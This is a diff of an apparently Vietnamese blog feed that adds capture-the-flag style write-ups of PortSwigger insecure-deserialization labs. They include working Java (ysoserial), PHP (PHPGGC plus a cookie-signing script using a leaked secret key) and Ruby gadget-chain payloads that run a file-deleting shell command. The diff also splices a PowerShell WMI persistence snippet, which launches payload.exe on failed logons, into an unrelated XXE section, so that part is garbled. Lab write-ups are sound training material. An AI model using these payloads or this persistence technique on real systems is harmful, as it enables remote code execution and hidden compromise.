@@ -353,6 +353,126 @@ You can log in to your own account using the following credentials: wiener:peter
 <p></p>
 <p>Solved</p>
 <p></p>
+<h2 id="5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</h2>
+<h3 id="description-4">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.
+To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<p>Cookie của ứng dụng là một Java serialize Object</p>
+<p></p>
+<p>Ở lab này, ta sẽ tạo <code>gadget chain</code> bằng ứng dụng có tên là <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">ysoserial</a>
+ để khai thác.</p>
+<p>Đầu tiên, vì ứng dụng sử dụng thư viện <code>Apache Commons Collections</code> nên ta sẽ sử dụng <code>gadget chain</code> có tên là <code>CommonsCollections1</code>,&hellip;, <code>CommonsCollections4</code> để sinh ra payload. Sau vài lần thử, ta có thể dụng được gadget<code>CommonsCollections4</code>.</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span>jar .<span style="color:#f92672">/</span>ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections4 <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span> 2<span style="color:#f92672">&gt;</span> nul <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w0 
+</span></span></code></pre></div><p></p>
+<p>Sử dụng payload vừa tạo và send request</p>
+<p></p>
+<p>Ứng dụng có mã lỗi 500 nhưng ta vẫn solve được challange.</p>
+<p></p>
+<h2 id="6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</h2>
+<h3 id="description-5">Description</h3>
+<blockquote>
+<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don&rsquo;t have source code access, you can still exploit this lab&rsquo;s insecure deserialization using pre-built gadget chains.
+To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Bài này tương tự bài trên nhưng sử dụng ngôn ngữ PHP. Tool ta sẽ sử dụng cho bài này có tên là <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">PHPGCC</a>
+</p>
+<p>Cookie là một <code>PHP serialize Object</code>. Trong đó, trường <code>sig_hmac_sha1</code> chính là <code>signature</code> để verify User object tại trường <code>token</code> có bị thay đổi hay không.</p>
+<p></p>
+<p>Khi ta nhập session sai và gửi request, server trả về thông báo lỗi <code>signature</code> sai và thư viện sử dụng:</p>
+<p></p>
+<p>Ở đây ứng dụng sử dụng thư viện <code>Symphony</code> version <code>4.3.6</code>
+Tiến hành tạo payload bằng <code>PHPGGC</code> tool.</p>
+<p></p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">Symfony</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RCE4</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;rm -rf /home/carlos/morale.txt&#39;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><p></p>
+<p>Vì server sử dụng <code>signature key</code> để verify user nên ta cần <code>SECRET_KEY</code> để hoàn thành payload.</p>
+<p>Đọc <code>source</code> html của ứng dụng có một đường dẫn <code>debug</code>:</p>
+<p></p>
+<p>Truy cập đường dẫn ta tìm được <code>SECRET_KEY</code></p>
+<p></p>
+<p>Sử dụng script này để sign  <code>SECRET_KEY</code> với <code>payload generated</code>:</p>
+<pre tabindex="0"><code>&lt;?php
+$payload = &#34;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo2OiJzeXN0ZW0iO319Cg==&#34;;
+$secret = &#34;hwo9dc4j2ef2vmehy8o01n6m6owbbz6b&#34;;
+$sig_hmac_sha1 = hash_hmac(&#34;sha1&#34;, $payload, $secret);
+
+$cookie = urlencode(&#39;{&#34;token&#34;:&#34;&#39;.$payload.&#39;&#34;,&#34;sig_hmac_sha1&#34;:&#34;&#39;.$sig_hmac_sha1.&#39;&#34;}&#39;);
+print_r($cookie);
+?&gt;
+</code></pre><p></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</h2>
+<h3 id="description-6">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
+To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>Session cookie là một <code>Ruby deserialize Object</code></p>
+<p></p>
+<p>Ở lab này, ta sẽ sử dụng script của một blog viết về <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noopener noreffer">Universal Deserialisation Gadget for Ruby 2.x-3.x</a>
+.</p>
+<p>Script có nội dung như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Autoload the required classes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the payload from running when we Marshal.dump it</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> Gem
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Requirement</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">marshal_dump</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>@requirements<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">Kernel</span>, <span style="color:#e6db74">:system</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@sets&#39;</span>, wa1)
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@git_set&#39;</span>, <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(rs, <span style="color:#e6db74">:resolve</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@read&#39;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@header&#39;</span>, <span style="color:#e6db74">&#34;aaa&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, i)
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@debug_output&#39;</span>, wa2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@requirements&#39;</span>, t)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(<span style="color:#f92672">[</span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>, <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>, r<span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;base64&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
+</span></span></code></pre></div><p></p>
+<p>Thay cookie và gửi request</p>
+<p></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p></p>
 ]]></description>
 </item>
 <item>
@@ -565,6 +685,9 @@ Payload</p>
 <p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <h2 id="exploitation-8">Exploitation</h2>
+<p>$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = &lsquo;root/cimv2&rsquo;; Name = &ldquo;UPDATER&rdquo;; Query = &ldquo;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &lsquo;Win32_NTLogEvent&rsquo; AND Targetinstance.EventCode = &lsquo;4625&rsquo; And Targetinstance.Message Like &lsquo;%fakeuser%&rsquo;&rdquo;; QueryLanguage = &lsquo;WQL&rsquo;}
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = &ldquo;UPDATER&rdquo;; CommandLineTemplate = &ldquo;C:\Users\sec560\Desktop\payload.exe&rdquo;}
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}</p>
 ]]></description>
 </item>
 <item>
